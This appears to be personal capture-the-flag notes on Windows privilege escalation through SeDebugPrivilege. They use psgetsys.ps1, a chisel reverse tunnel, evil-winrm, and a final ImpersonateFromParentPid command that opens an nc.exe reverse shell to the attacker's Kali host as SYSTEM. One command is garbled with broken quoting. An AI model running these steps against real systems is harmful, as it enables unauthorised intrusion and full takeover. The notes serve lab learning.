![](<attachments/Pasted image 20260110010425.png>)
![](<attachments/Pasted image 20260110010657.png>)
	https://book.hacktricks.wiki/en/index.html?search=SeDebugPrivilege

![](<attachments/Pasted image 20260110010840.png>)
![](<attachments/Pasted image 20260110011106.png>)
we transfer it to Windows and start looking for a process that runs as administrator
```powershell
tasklist /v /FO LIST
```
![](<attachments/Pasted image 20260110011327.png>)
now we import the .ps1 script
```powershell
Import-Module .\psgetsys.ps1
```
![](<attachments/Pasted image 20260110011559.png>)
...
.\chisel.exe client 10.10.14.225:1234 R:5985:127.0.0.1:5985
```

now we connect with `evil-win`
![](<attachments/Pasted image 20260110021749.png>)
we upload the file that abuses the `psgetsys.ps1` privilege and execute it to get a reverse shell with `nc.exe` as `NT AUTHORITY`

![](<attachments/Pasted image 20260110021939.png>)
```powershell
ImpersonateFromParentPid -ppid 552 -command "C:\Windows\System32..."/c C:\Users\alaading\Documents\nc.exe -e cmd 10.10.14.225 4444"

```
and the connection arrives on our Kali
![](<attachments/Pasted image 20260110022215.png>)
